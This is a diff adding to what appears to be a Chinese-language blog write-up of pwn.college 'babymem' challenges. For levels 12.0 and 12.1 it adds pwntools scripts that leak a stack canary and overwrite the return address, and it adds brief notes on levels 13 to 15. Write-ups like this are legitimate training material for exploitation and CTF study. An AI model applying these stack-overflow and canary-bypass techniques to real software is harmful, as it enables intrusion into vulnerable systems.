@@ -3690,7 +3690,60 @@ p.send(payload)
 p.interactive()
 
 </code></pre>
-<h4 id="level12-0">level12.0<a class="post-anchor" href="#level12-0"></a></h4><h4 id="level12-1">level12.1<a class="post-anchor" href="#level12-1"></a></h4><h4 id="level13-0">level13.0<a class="post-anchor" href="#level13-0"></a></h4><h4 id="level13-1">level13.1<a class="post-anchor" href="#level13-1"></a></h4><h4 id="level14-0">level14.0<a class="post-anchor" href="#level14-0"></a></h4><h4 id="level14-1">level14.1<a class="post-anchor" href="#level14-1"></a></h4><h4 id="level15-0">level15.0<a class="post-anchor" href="#level15-0"></a></h4><h4 id="level15-1">level15.1<a class="post-anchor" href="#level15-1"></a></h4></body></html>]]></content>
+<h4 id="level12-0">level12.0<a class="post-anchor" href="#level12-0"></a></h4><p>​        这道题的trick就在于可以反复调用函数<code>challenge</code>，每一次调用虽然栈会被clear但是canary不变，从而泄露canary。思路其实比较简单，但是调试有些令人恼火。</p>
+<pre><code class="python">from pwn import*
+
+p = process("/challenge/babymem_level12.0")
+
+payload1 =  b'a'*35+b"REPEAT"
+
+p.sendline(b"41")
+p.send(payload1)
+p.recvuntil('You said:')
+
+canary = u64(p.recv()[41:49])
+canary  -= 0x54
+
+payload2 = b'a'*41 + p64(canary) + b'a'*8 + b"\x91\xb0"
+p.send('100')
+p.send(payload2)
+
+p.interactive()
+</code></pre>
+<h4 id="Level12-1">Level12.1<a class="post-anchor" href="#Level12-1"></a></h4><p>​    同理，但是需要好好调。 </p>
+<pre><code class="python">from pwn import*
+
+context.terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+
+p = process("./babymem_level12.1")
+
+payload1 =  b'a'*83+b"REPEAT"
+
+p.sendline(b"89")
+gdb.attach(p)
+p.send(payload1)
+p.recvuntil('You said:')
+canary = u64(p.recv()[89:97])
+
+canary  -= 0x54
+print(hex(canary))
+
+payload2 = b'a'*89 + p64(canary) + b'a'*8 + b"\x63\x18"
+
+p.send('112')
+p.send(payload2)
+pause()
+
+p.interactive()
+</code></pre>
+<h4 id="level13-0">level13.0<a class="post-anchor" href="#level13-0"></a></h4><p>​        。。输几个a就有flag，具体方法看13.1。</p>
+<h4 id="level13-1">level13.1<a class="post-anchor" href="#level13-1"></a></h4><p>​        我觉得是最简单的level了。。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.35.04.png" data-caption="截屏2022-03-10 下午2.35.04" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.35.04.png" alt="截屏2022-03-10 下午2.35.04"></a></p>
+<p>​        找到input buffer和flag间地址的填充量，填大于等于的a就行，数量没有必要精确。这个题脚本都没有写，实在太傻逼了。</p>
+<h4 id="level14">level14<a class="post-anchor" href="#level14"></a></h4><p>​        其实我觉得这个题没有写的必要了，纯纯的就是13和12的结合。</p>
+<h4 id="level15-0">level15.0<a class="post-anchor" href="#level15-0"></a></h4><p>​        一个奇怪的socket网络通信，我觉得思路是通过fork多个子进程来leak canary，但是由于从来没有接触过，所以先研究一会儿吧。</p>
+</body></html>]]></content>
       <tags>
         <tag>pwncollege</tag>
       </tags>
